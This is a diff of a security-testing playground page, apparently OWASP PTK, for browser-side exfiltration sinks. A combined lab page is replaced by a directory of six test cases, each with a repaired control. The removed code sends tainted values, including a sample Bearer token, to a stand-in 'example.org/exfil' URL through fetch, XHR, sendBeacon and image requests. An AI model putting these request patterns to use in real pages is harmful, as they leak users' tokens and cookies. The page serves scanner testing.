@@ -2,207 +2,96 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>IAST HTTP Exfiltration Sinks</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 24px; background: #0f172a; color: #e2e8f0; }
-    h1 { margin-top: 0; }
-    .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
-    .sources { display: grid; gap: 8px; margin-top: 8px; }
-    .sources label { display: flex; gap: 8px; align-items: center; }
-    .sources table { width: 100%; border-collapse: collapse; margin-top: 8px; }
-    .sources td { padding: 4px 6px; border-bottom: 1px solid #1f2937; vertical-align: top; }
-    label { display: block; margin: 8px 0 4px; color: #cbd5e1; }
-    input, textarea, button { width: 100%; border-radius: 10px; border: 1px solid #1f2937; padding: 10px; background: #0b1220; color: #e2e8f0; }
-    input[type="radio"] { width: auto; padding: 0; }
-    textarea { min-height: 90px; }
-    button { cursor: pointer; font-weight: 600; background: #2563eb; border: none; margin-top: 8px; }
-    button:hover { background: #1d4ed8; }
-    .note { color: #94a3b8; font-size: 0.9rem; }
-    .row { display: grid; gap: 8px; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
-  
-    .back-link {
-      display: inline-block;
-      margin-bottom: 12px;
-      color: #93c5fd;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .back-link:hover {
-      text-decoration: underline;
-    }
-  </style>
+  <title>Client HTTP Exfiltration Module · IAST · OWASP PTK Playground</title>
+  <meta name="description" content="Focused IAST review and repaired cases for Client HTTP Exfiltration Module.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'">
+  <link rel="stylesheet" href="../assets/css/playground.css">
 </head>
-<body>
-  <a class="back-link" href="index.html">← Back to index</a>
-  <h1>IAST Client HTTP Exfiltration Module</h1>
-  <p class="note">Exercises fetch/XHR/sendBeacon/image.src sinks with tainted data in URL, headers, or body.</p>
-
-  <div class="card">
-    <label for="url">URL (tainted)</label>
-    <input id="url" type="text" placeholder="https://example.org/exfil">
-    <div class="row">
-      <button id="use-same-origin" type="button">Use same-origin URL</button>
-      <button id="use-cross-origin" type="button">Use cross-origin URL</button>
+<body class="engine-page engine-page--iast family-directory-page" data-family-directory="iast/iast_client_http_exfiltration.html">
+  <a class="skip-link" href="#cases">Skip to cases</a>
+  <header class="site-header">
+    <div class="site-header__inner">
+      <a class="brand" href="../"><span class="brand__mark" aria-hidden="true">PTK</span><span>OWASP PTK Playground</span></a>
+      <nav class="site-nav" aria-label="Playground navigation"><a href="../play/">Play</a><a href="../explore/?engine=IAST">Explore IAST</a></nav>
     </div>
-    <label for="headers">Headers JSON (tainted)</label>
-    <textarea id="headers" placeholder='{"Authorization": "Bearer TAINT"}'></textarea>
-    <label for="body">Body (tainted)</label>
-    <textarea id="body" placeholder='{"token":"TAINT"}'></textarea>
-    <div class="sources">
-      <div class="note">Choose which source to prime before triggering sinks.</div>
-      <label><input type="radio" name="sourceType" value="query" checked> URL query (?url=...)</label>
-      <label><input type="radio" name="sourceType" value="hash"> URL hash</label>
-      <label><input type="radio" name="sourceType" value="cookie"> document.cookie</label>
-      <label><input type="radio" name="sourceType" value="localStorage"> localStorage</label>
-      <label><input type="radio" name="sourceType" value="sessionStorage"> sessionStorage</label>
-      <label><input type="radio" name="sourceType" value="windowName"> window.name</label>
-      <label><input type="radio" name="sourceType" value="inputOnly"> input only</label>
-      <button id="prime-selected">Prime selected source</button>
-      <button id="prime-all">Prime ALL sources</button>
-      <div id="active-sources"></div>
-    </div>
-    <p class="note">Taint is pulled from ?url=..., ?body=..., or the fields above when you click "Prime taint sources".</p>
-  </div>
-
-  <div class="card">
-    <button id="btn-fetch-url">fetch(url)</button>
-    <button id="btn-fetch-headers" style="margin-top:8px;">fetch(url, { headers })</button>
-    <button id="btn-fetch-body" style="margin-top:8px;">fetch(url, { method: 'POST', body })</button>
-    <button id="btn-xhr" style="margin-top:8px;">XMLHttpRequest.open/send</button>
-    <button id="btn-beacon" style="margin-top:8px;">navigator.sendBeacon(url, body)</button>
-    <button id="btn-image" style="margin-top:8px;">image.src = url</button>
-  </div>
-
-  <script>
-    function getParam(name) {
-      const params = new URLSearchParams(location.search);
-      const hash = location.hash ? decodeURIComponent(location.hash.slice(1)) : '';
-      if (name === 'hash') return hash;
-      return params.get(name) || '';
-    }
-
-    const sources = {
-      inputOnly: { label: 'Input only', value: '' },
-      query: { label: 'URL query ?url', value: null },
-      hash: { label: 'URL hash', value: null },
-      cookie: { label: 'document.cookie "iast_payload"', value: null },
-      localStorage: { label: 'localStorage["iast_payload"]', value: null },
-      sessionStorage: { label: 'sessionStorage["iast_headers"]', value: null },
-      windowName: { label: 'window.name', value: null }
-    };
-
-    function getSelectedSourceType() {
-      const checked = document.querySelector('input[name="sourceType"]:checked');
-      return checked ? checked.value : 'query';
-    }
-
-    function setSourceValue(type, url, headers, body) {
-      if (!sources[type]) return;
-      sources[type].value = url || headers || body || '';
-      switch (type) {
-        case 'query':
-          break;
-        case 'hash':
-          window.location.hash = 'url=' + encodeURIComponent(url || '');
-          break;
-        case 'cookie':
-          if (url) document.cookie = 'iast_payload=' + encodeURIComponent(url) + '; path=/';
-          break;
-        case 'localStorage':
-          if (url) localStorage.setItem('iast_payload', url);
-          break;
-        case 'sessionStorage':
-          if (headers) sessionStorage.setItem('iast_headers', headers);
-          break;
-        case 'windowName':
-          if (body) window.name = body;
-          break;
-        case 'inputOnly':
-        default:
-          break;
-      }
-      renderActiveSources();
-    }
-
-    function primeSelectedSource(url, headers, body) {
-      const type = getSelectedSourceType();
-      setSourceValue(type, url, headers, body);
-    }
-
-    function primeAllSources(url, headers, body) {
-      Object.keys(sources).forEach(type => setSourceValue(type, url, headers, body));
-    }
-
-    function renderActiveSources() {
-      const rows = Object.keys(sources).map(type => {
-        const { label, value } = sources[type];
-        const display = value == null || value === ''
-          ? '<em>(empty)</em>'
-          : '<code>' + String(value).replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</code>';
-        return '<tr><td style="width: 35%;"><strong>' + label + '</strong></td><td>' + display + '</td></tr>';
-      });
-      document.getElementById('active-sources').innerHTML =
-        '<h3>Active sources</h3><table><tbody>' + rows.join('') + '</tbody></table>';
-    }
-
-    const urlField = document.getElementById('url');
-    const headersField = document.getElementById('headers');
-    const bodyField = document.getElementById('body');
-
-    urlField.value = getParam('url') || "https://example.org/exfil?token=TAINT";
-    headersField.value = getParam('headers') || '{"Authorization":"Bearer TAINT"}';
-    bodyField.value = getParam('body') || '{"token":"TAINT"}';
-
-    document.getElementById('use-same-origin').onclick = () => {
-      urlField.value = location.origin + '/iast-probe';
-    };
-
-    document.getElementById('use-cross-origin').onclick = () => {
-      urlField.value = 'https://example.org/exfil?token=TAINT';
-    };
-
-    document.getElementById('prime-selected').onclick = () => {
-      primeSelectedSource(urlField.value, headersField.value, bodyField.value);
-      alert('Selected source primed.');
-    };
-
-    document.getElementById('prime-all').onclick = () => {
-      primeAllSources(urlField.value, headersField.value, bodyField.value);
-      alert('All sources primed.');
-    };
-
-    document.getElementById('btn-fetch-url').onclick = () => {
-      fetch(urlField.value).catch(() => {});
-    };
-
-    document.getElementById('btn-fetch-headers').onclick = () => {
-      let hdrs = {};
-      try { hdrs = JSON.parse(headersField.value || '{}'); } catch (_) {}
-      fetch(urlField.value, { headers: hdrs }).catch(() => {});
-    };
-
-    document.getElementById('btn-fetch-body').onclick = () => {
-      fetch(urlField.value, { method: 'POST', body: bodyField.value }).catch(() => {});
-    };
-
-    document.getElementById('btn-xhr').onclick = () => {
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', urlField.value);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.send(bodyField.value);
-    };
-
-    document.getElementById('btn-beacon').onclick = () => {
-      navigator.sendBeacon(urlField.value, bodyField.value);
-    };
-
-    document.getElementById('btn-image').onclick = () => {
-      const img = new Image();
-      img.src = urlField.value;
-    };
-
-    renderActiveSources();
-  </script>
+  </header>
+  <main class="page-shell">
+    <section class="engine-hero family-hero">
+      <nav class="breadcrumbs" aria-label="Breadcrumb"><a href="../">Playground</a><span aria-hidden="true">/</span><a href="./">IAST</a><span aria-hidden="true">/</span><span>Client HTTP Exfiltration Module</span></nav>
+      <p class="eyebrow">IAST case family</p>
+      <h1>Client HTTP Exfiltration Module</h1>
+      <p class="engine-hero__lede">Trigger one live browser runtime flow at a time and compare it with the paired repaired behavior.</p>
+      <div class="family-hero__facts" aria-label="Family summary"><span><strong>6</strong> focused cases</span><span><strong>6</strong> repaired controls</span></div>
+    </section>
+    <aside class="notice notice--engine" aria-label="How to use this family">
+      <span class="notice__icon" aria-hidden="true">↯</span>
+      <p><strong>Choose a single case.</strong> Start the relevant PTK engine, open its review target and perform the prepared action when one is shown. Use the repaired control to verify that normal behavior remains while the unsafe boundary is removed.</p>
+    </aside>
+    <section id="cases" class="section" aria-labelledby="cases-title">
+      <div class="section-heading"><div><p class="eyebrow">Focused targets</p><h2 id="cases-title">One page per unique case</h2></div></div>
+      <div class="family-case-grid">
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-client-http-exfiltration.btn-fetch-url">
+        <div class="family-case-card__meta"><span>Case 01</span><span>client request</span></div>
+        <h2>fetch(url)</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-fetch-url/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-fetch-url/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-client-http-exfiltration.btn-fetch-headers">
+        <div class="family-case-card__meta"><span>Case 02</span><span>client request</span></div>
+        <h2>fetch(url, { headers })</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-fetch-headers/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-fetch-headers/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-client-http-exfiltration.btn-fetch-body">
+        <div class="family-case-card__meta"><span>Case 03</span><span>client request</span></div>
+        <h2>fetch(url, { method: &#39;POST&#39;, body })</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-fetch-body/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-fetch-body/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-client-http-exfiltration.btn-xhr">
+        <div class="family-case-card__meta"><span>Case 04</span><span>client request</span></div>
+        <h2>XMLHttpRequest.open/send</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-xhr/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-xhr/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-client-http-exfiltration.btn-beacon">
+        <div class="family-case-card__meta"><span>Case 05</span><span>client request</span></div>
+        <h2>navigator.sendBeacon(url, body)</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-beacon/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-beacon/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      <article class="family-case-card" data-challenge-id="iast.atomic.iast-iast-client-http-exfiltration.btn-image">
+        <div class="family-case-card__meta"><span>Case 06</span><span>client request</span></div>
+        <h2>image.src = url</h2>
+        <p>Run this browser-security case independently, then compare it with the behavior-preserving repaired control.</p>
+        <div class="button-row">
+          <a class="button" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-image/review/">Open review target</a>
+          <a class="button button--secondary" href="../atomic/iast/iast-iast-client-http-exfiltration/btn-image/fixed/">Open repaired control</a>
+        </div>
+      </article>
+      </div>
+    </section>
+    <aside class="advanced-lab-panel">
+      <div><p class="eyebrow">Compatibility lab</p><h2>Need every historical case on one page?</h2><p>The combined lab is retained for regression and scanner-compatibility work. It is deliberately denser than the focused playground journey.</p></div>
+      <a class="button button--secondary" href="./iast_client_http_exfiltration.advanced.html">Open Advanced combined lab</a>
+    </aside>
+  </main>
+  <footer class="site-footer"><div class="site-footer__inner"><p>IAST family directory · scanner-neutral review and repaired targets.</p><nav aria-label="Project links"><a href="../play/">Play</a><a href="../explore/?engine=IAST">Explore IAST</a><a href="https://owasp.org/www-project-penetration-testing-kit/">OWASP PTK</a></nav></div></footer>
 </body>
 </html>
